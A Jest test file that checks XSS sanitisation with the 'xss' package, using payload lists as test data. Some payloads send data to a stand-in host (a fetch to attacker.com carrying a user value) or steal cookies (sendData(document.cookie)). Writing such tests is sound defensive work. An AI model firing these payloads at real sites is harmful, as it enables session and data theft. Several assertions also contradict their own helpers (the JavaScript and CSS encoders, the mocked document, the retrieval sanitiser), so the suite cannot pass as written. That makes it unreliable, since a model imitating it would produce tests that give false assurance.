/**
 * XSS (Cross-Site Scripting) Prevention Tests
 * Comprehensive XSS attack payload validation and mitigation
 */

import { describe, it, expect, beforeEach } from '@jest/globals';
import xss from 'xss';

describe('XSS Prevention Tests', () => {
  const xssPayloads = {
    basic: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>'
    ],
    eventHandlers: [
      '<img src=x onerror="fetch(\'http://attacker.com\')">',
      '<div onmouseover="fetch(\'http://attacker.com?user=\'+user)">',
      '<p onclick="window.location=\'http://malicious.com\'">Click me</p>',
      '<a href="javascript:void(0)" onmousedown="stealCookies()">Link</a>',
      '<button ondblclick="sendData(document.cookie)">Double click</button>'
    ],
    dataProtocols: [
      '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
      '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
      '<a href="data:text/html,<h1>XSS</h1>">Click</a>'
    ],
    attributeInjection: [
      '<img src=x alt="test" title="test" onerror=alert("XSS")>',
      '<div id="x" data-test="test" onload="alert(\'XSS\')"></div>',
      '<span class="x" data-value="\' onload=alert(\'XSS\')">Test</span>'
    ],
    htmlEncoding: [
      '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
      '&#60;img src=x onerror=alert("XSS")&#62;',
      '&#x3c;svg onload=alert("XSS")&#x3e;'
    ],
    unicodeEscaping: [
      '<\\u0069mg src=x onerror=alert("XSS")>',
      '<\\x69mg src=x onerror=alert("XSS")>',
      '<img src=x onerror=\\x61lert("XSS")>'
    ],
    eventHandlerEvasion: [
      '<img src=x \\ onerror=alert("XSS")>',
      '<img src=x / onerror=alert("XSS")>',
      '<img src=x \n onerror=alert("XSS")>',
      '<img src=x \r onerror=alert("XSS")>'
    ]
  };

  beforeEach(() => {
    // Setup XSS filter with strict configuration
    xss.setOptions({
      whiteList: {},
      stripIgnoredTag: true,
      stripLeadingAndTrailingWhitespace: true
    });
  });

  describe('Basic XSS Prevention', () => {
    it('should remove script tags', () => {
      xssPayloads.basic.forEach(payload => {
        const cleaned = xss(payload);
        expect(cleaned).not.toContain('<script');
        expect(cleaned).not.toContain('alert');
      });
    });

    it('should remove event handlers from tags', () => {
      xssPayloads.eventHandlers.forEach(payload => {
        const cleaned = xss(payload);
        expect(cleaned).not.toContain('onerror');
        expect(cleaned).not.toContain('onload');
        expect(cleaned).not.toContain('onmouseover');
        expect(cleaned).not.toContain('onclick');
      });
    });

    it('should prevent data: protocol execution', () => {
      xssPayloads.dataProtocols.forEach(payload => {
        const cleaned = xss(payload);
        expect(cleaned).not.toContain('data:text/html');
        expect(cleaned).not.toContain('javascript:');
      });
    });

    it('should handle attribute injection attempts', () => {
      xssPayloads.attributeInjection.forEach(payload => {
        const cleaned = xss(payload);
        expect(cleaned).not.toContain('onerror');
        expect(cleaned).not.toContain('onload');
      });
    });
  });

  describe('HTML Encoding Attacks', () => {
    it('should handle HTML entity encoded XSS', () => {
      const payload = '&lt;img src=x onerror=alert("XSS")&gt;';
      const decoded = decodeHTMLEntities(payload);
      const cleaned = xss(decoded);

      expect(cleaned).not.toContain('onerror');
    });

    it('should handle numeric HTML entities', () => {
      const payload = '&#60;img src=x onerror=alert("XSS")&#62;';
      const decoded = decodeHTMLEntities(payload);
      const cleaned = xss(decoded);

      expect(cleaned).not.toContain('onerror');
    });

    it('should handle hex encoded HTML entities', () => {
      const payload = '&#x3c;img src=x onerror=alert("XSS")&#x3e;';
      const decoded = decodeHTMLEntities(payload);
      const cleaned = xss(decoded);

      expect(cleaned).not.toContain('onerror');
    });
  });

  describe('Output Encoding', () => {
    it('should properly encode output for HTML context', () => {
      const userInput = '<script>alert("XSS")</script>';
      const encoded = encodeForHTML(userInput);

      expect(encoded).not.toContain('<script>');
      expect(encoded).toContain('&lt;');
      expect(encoded).toContain('&gt;');
    });

    it('should properly encode output for JavaScript context', () => {
      const userInput = '"; fetch(\'http://attacker.com\'); "';
      const encoded = encodeForJavaScript(userInput);

      expect(encoded).not.toContain('"');
      expect(encoded).toContain('\\"');
    });

    it('should properly encode output for URL context', () => {
      const userInput = 'javascript:alert("XSS")';
      const encoded = encodeForURL(userInput);

      expect(encoded).not.toContain('javascript:');
      expect(encoded).toContain('%3A');
    });

    it('should properly encode output for CSS context', () => {
      const userInput = 'expression(alert("XSS"))';
      const encoded = encodeForCSS(userInput);

      expect(encoded).not.toContain('expression');
    });
  });

  describe('DOM-based XSS Prevention', () => {
    it('should not use innerHTML for user-controlled content', () => {
      const userInput = '<img src=x onerror=alert("XSS")>';
      const safe = sanitizeAndSetTextContent(userInput);

      expect(safe).not.toContain('onerror');
    });

    it('should use textContent instead of innerHTML', () => {
      const userInput = '<script>alert("XSS")</script>';
      const element = document.createElement('div');
      element.textContent = userInput; // Safe - sets as text, not HTML

      expect(element.innerHTML).toContain('&lt;script&gt;');
      expect(element.innerHTML).not.toContain('<script>');
    });

    it('should validate href attributes for javascript protocol', () => {
      const urls = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:alert("XSS")',
        'http://safe.com'
      ];

      urls.forEach(url => {
        const safe = isSafeURL(url);
        if (url.startsWith('http')) {
          expect(safe).toBe(true);
        } else {
          expect(safe).toBe(false);
        }
      });
    });
  });

  describe('Template Injection Prevention', () => {
    it('should not allow template syntax in user input', () => {
      const payload = '{{ constructor.prototype.pollution.attack = 1 }}';
      const cleaned = xss(payload);

      expect(cleaned).not.toContain('{{');
      expect(cleaned).not.toContain('constructor');
    });

    it('should escape template expressions', () => {
      const payload = '<%= eval("alert(\'XSS\')") %>';
      const cleaned = xss(payload);

      expect(cleaned).not.toContain('eval');
    });
  });

  describe('SVG and Vector Graphic XSS', () => {
    it('should sanitize SVG elements', () => {
      const svgPayload = '<svg><animate onload="alert(\'XSS\')" />';
      const cleaned = xss(svgPayload);

      expect(cleaned).not.toContain('onload');
    });

    it('should remove dangerous SVG attributes', () => {
      const svgPayload = '<svg><use href="data:image/svg+xml,<svg onload=alert(\'XSS\')></svg>"></use></svg>';
      const cleaned = xss(svgPayload);

      expect(cleaned).not.toContain('data:image/svg+xml');
    });
  });

  describe('JSON Hijacking Prevention', () => {
    it('should not allow JSONP callback hijacking', () => {
      const userInput = 'callback=alert("XSS")//';
      const cleaned = xss(userInput);

      expect(cleaned).not.toContain('alert');
    });

    it('should sanitize JSON responses containing user data', () => {
      const userData = '<script>alert("XSS")</script>';
      const jsonResponse = {
        user: userData,
        message: userData
      };

      const sanitized = sanitizeJSONResponse(jsonResponse);
      expect(sanitized.user).not.toContain('<script>');
      expect(sanitized.message).not.toContain('<script>');
    });
  });

  describe('Content Security Policy Compliance', () => {
    it('should allow safe content under strict CSP', () => {
      const safeContent = '<p>Hello, World!</p>';
      const cleaned = xss(safeContent);

      expect(cleaned).toContain('Hello, World');
    });

    it('should reject inline scripts under CSP', () => {
      const inlineScript = '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>';
      const cleaned = xss(inlineScript);

      expect(cleaned).not.toContain('javascript:');
    });

    it('should not allow style attributes with expressions', () => {
      const stylePayload = '<div style="background: url(javascript:alert(\'XSS\'))">Test</div>';
      const cleaned = xss(stylePayload);

      expect(cleaned).not.toContain('javascript:');
    });
  });

  describe('Special Character and Encoding Attacks', () => {
    it('should handle null byte injection', () => {
      const payload = '<script>alert("XSS")\x00</script>';
      const cleaned = xss(payload);

      expect(cleaned).not.toContain('<script');
    });

    it('should handle mixed case attacks', () => {
      const payload = '<ScRiPt>alert("XSS")</sCrIpT>';
      const cleaned = xss(payload);

      expect(cleaned.toLowerCase()).not.toContain('<script');
    });

    it('should handle whitespace bypasses', () => {
      const payloads = [
        '<script  >alert("XSS")</script>',
        '<script\n>alert("XSS")</script>',
        '<script\r>alert("XSS")</script>',
        '<script\t>alert("XSS")</script>'
      ];

      payloads.forEach(payload => {
        const cleaned = xss(payload);
        expect(cleaned).not.toContain('<script');
      });
    });
  });

  describe('Form and Input XSS Prevention', () => {
    it('should sanitize form input values', () => {
      const formData = {
        username: '<img src=x onerror=alert("XSS")>',
        email: '<script>steal()</script>',
        message: '"><script>alert("XSS")</script><"'
      };

      const sanitized = sanitizeFormData(formData);
      expect(sanitized.username).not.toContain('onerror');
      expect(sanitized.email).not.toContain('<script');
      expect(sanitized.message).not.toContain('<script');
    });

    it('should handle placeholder and title attributes', () => {
      const payload = '<input placeholder="\'" onmouseover="alert(\'XSS\')">';
      const cleaned = xss(payload);

      expect(cleaned).not.toContain('onmouseover');
    });
  });

  describe('Stored XSS Prevention', () => {
    it('should sanitize data before storage', () => {
      const userInput = '<img src=x onerror=alert("XSS")>';
      const stored = sanitizeAndStore(userInput);

      expect(stored).not.toContain('onerror');
    });

    it('should sanitize data on retrieval', () => {
      const stored = '<div>Normal text</div>';
      const retrieved = sanitizeOnRetrieval(stored);

      expect(retrieved).not.toContain('<div>');
      expect(retrieved).toContain('Normal text');
    });
  });

  describe('Reflected XSS Prevention', () => {
    it('should escape query parameters in responses', () => {
      const queryParam = '<script>alert("XSS")</script>';
      const response = buildResponse(queryParam);

      expect(response).not.toContain('<script');
      expect(response).toContain('&lt;script');
    });

    it('should not reflect unescaped user input', () => {
      const userInput = '"><script>alert("XSS")</script>';
      const response = buildResponse(userInput);

      expect(response).not.toContain('<script');
    });
  });
});

// Helper functions
function decodeHTMLEntities(text) {
  const entities = {
    '&lt;': '<',
    '&gt;': '>',
    '&quot;': '"',
    '&#60;': '<',
    '&#62;': '>',
    '&#x3c;': '<',
    '&#x3e;': '>'
  };

  let result = text;
  for (const [entity, char] of Object.entries(entities)) {
    result = result.replace(new RegExp(entity, 'g'), char);
  }
  return result;
}

function encodeForHTML(text) {
  const map = {
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
    '&': '&amp;'
  };

  return text.replace(/[<>"'&]/g, char => map[char]);
}

function encodeForJavaScript(text) {
  return text
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/'/g, "\\'")
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r');
}

function encodeForURL(text) {
  return encodeURIComponent(text);
}

function encodeForCSS(text) {
  return text.replace(/[()]/g, c => `\\${c.charCodeAt(0).toString(16)}`);
}

function sanitizeAndSetTextContent(html) {
  const div = document.createElement('div');
  div.textContent = html;
  return div.innerHTML;
}

function isSafeURL(url) {
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'http:' || parsed.protocol === 'https:';
  } catch {
    return false;
  }
}

function sanitizeJSONResponse(obj) {
  const result = {};
  for (const [key, value] of Object.entries(obj)) {
    if (typeof value === 'string') {
      result[key] = xss(value);
    } else {
      result[key] = value;
    }
  }
  return result;
}

function sanitizeFormData(data) {
  const result = {};
  for (const [key, value] of Object.entries(data)) {
    result[key] = xss(value);
  }
  return result;
}

function sanitizeAndStore(data) {
  return xss(data);
}

function sanitizeOnRetrieval(data) {
  return xss(data);
}

function buildResponse(input) {
  return `<p>Search results for: ${encodeForHTML(input)}</p>`;
}

// Mock document for testing
global.document = {
  createElement: (tag) => ({
    textContent: '',
    innerHTML: '',
    style: {}
  })
};
